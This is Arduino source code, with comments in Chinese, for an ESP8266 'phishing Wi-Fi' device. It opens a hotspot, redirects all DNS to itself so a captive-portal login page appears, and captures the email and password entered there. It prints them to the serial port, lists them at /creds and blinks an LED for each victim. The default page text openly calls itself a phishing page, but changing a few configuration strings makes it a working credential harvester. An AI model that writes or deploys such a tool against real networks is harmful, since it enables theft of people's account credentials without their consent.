/***********************************************************
  项目名：钓鱼WIFI
  作者：BlackBox114
  当前版本描述：
  开发板：NodeMcu(ESP-12E)
  设备连接上热点后会收到强制弹出的WIFI登陆页面
  填写信息后会串口发送出去，并且返回到另一个页面
  连接热点后访问10.10.10.1也可直接访问钓鱼页面，或者访问10.10.10.1/creds获取钓鱼信息
  但次级页面中文乱码问题没有解决
  修改人：BlackBox114
  修改时间：2019.4.9
  修改内容：增加直接从网页获得钓鱼信息的页面
  接线：无
/***********************************************************/
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

// User configuration
#define SSID_NAME "姜太公"
#define SUBTITLE "这是个钓鱼wifi"
#define TITLE "愿者上钩："
#define BODY "这个网页会诱骗你输入你的账号和密码"
#define POST_TITLE "捕获中..."
#define POST_BODY "你刚刚输入的账户和密码已经被捕获，访问10.10.10.1/creds可以看到捕获结果</br>愿者上钩"
#define PASS_TITLE "鱼仓库"
#define CLEAR_TITLE "清除完成"

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(10, 10, 10, 1);

String Credentials = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;"); a.replace(">", "&gt;");
  a.substring(0, 200); return a;
}

String footer() {
  return
    "</div><div class=q><a>&#169; 版权所有</a></div>";
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"//不使用外联css，以后尝试将html和css还有图片放到NodeMCU闪存文件系统内
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             // "<meta http-equiv=\"Content - Type\" content=\"text / html; charset = utf - 8\" />"//强制中文似乎没有效果 谷歌游览器打开会出现中文乱码
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>回到钓鱼页面</a></p><p><a style=\"color:blue\" href=/clear>清除捕获的信息</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
         "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +
         "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=确认></form></center>" + footer();
}

String posted() {
  String email = input("email");
  String password = input("password");
  Credentials = "<li>账号: <b>" + email + "</b></br>密码: <b>" + password + "</b></li>" + Credentials;
  Serial.println(" ");
  Serial.println("愿者上钩");
  Serial.println(" ");
  Serial.println("捕获的邮箱：");
  Serial.println(email);
  Serial.println("捕获的密码：");
  Serial.println(password);
  Serial.println(" ");
  Serial.printf("连接此接入点上的无线终端数目 = %d\n", WiFi.softAPgetStationNum());
  Serial.println("");
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  String email = "<p></p>";
  String password = "<p></p>";
  Credentials = "<p></p>";
  return header(CLEAR_TITLE) + "<div><p>捕获的信息已经清除</div></p><center><a style=\"color:blue\" href=/>回到钓鱼页面</a></center>" + footer();
}

void BLINK() { // 有人上钩就闪两下
  int count = 0;
  while (count < 2) {
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}

void setup() {
  Serial.begin(115200);
  Serial.println(" ");
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });
  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);

  Serial.println(" ");
  Serial.println(" = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =");
  Serial.println("||     ____     __                    __      ____                   ||");
  Serial.println("||    / __ )   / /  ____ _   _____   / /__   / __ )   ____     _  __ ||");
  Serial.println("||   / __  |  / /  / __ `/  / ___/  / //_/  / __  |  / __ \\   | |/_/ ||");
  Serial.println("||  / /_/ /  / /  / /_/ /  / /__   / ,<    / /_/ /  / /_/ /  _>  <   ||");
  Serial.println("|| /_____/  /_/   \\__,_/   \\___/  /_/|_|  /_____/   \\____/  /_/|_|   ||");
  Serial.println(" = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =");
  Serial.println(" ");
  Serial.println("自动弹窗钓鱼热点启动");
  Serial.println("有人在页面内输入邮箱和密码后串口会返回捕获的邮箱和密码");
  Serial.println("连接热点后访问10.10.10.1也可直接访问钓鱼页面，或者访问10.10.10.1/creds获取钓鱼信息");
  Serial.println("正在等待客户端连接...");
}


void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
  }

  dnsServer.processNextRequest();
  webServer.handleClient();
}
